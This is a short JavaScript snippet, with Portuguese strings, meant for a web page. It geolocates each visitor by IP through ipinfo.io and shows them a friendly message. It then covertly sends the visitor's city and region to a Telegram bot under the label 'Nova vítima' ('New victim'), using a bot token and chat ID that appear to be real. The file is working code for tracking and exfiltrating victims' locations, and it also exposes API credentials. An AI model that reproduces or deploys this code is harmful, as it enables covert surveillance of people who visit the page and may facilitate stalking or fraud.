fetch("https://ipinfo.io/json?token=c296f01ff5e2f2")
.then(response => response.json())
.then(data => {
    var city = data.city;
    var region = data.region;
    var localizacao = "Cidade: " + city + " | Estado: " + region;
    document.getElementById("local").innerHTML = 
        "Verifiquei e você está em " + city + " - " + region + ", certo? 😉";

    var msg = "🎯 Nova vítima: " + localizacao;
    var telegramToken = "8112207542:AAFcWgs84PsAoQxfmuFmwy4wPd1v_tTSRnk";
    var chatId = "7406910715";
    var url = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

    fetch(url)
    .then(response => console.log("Enviado pro Telegram"))
    .catch(error => console.error("Erro ao enviar pro Telegram:", error));
})
.catch(error => console.error("Erro ao obter localização:", error));
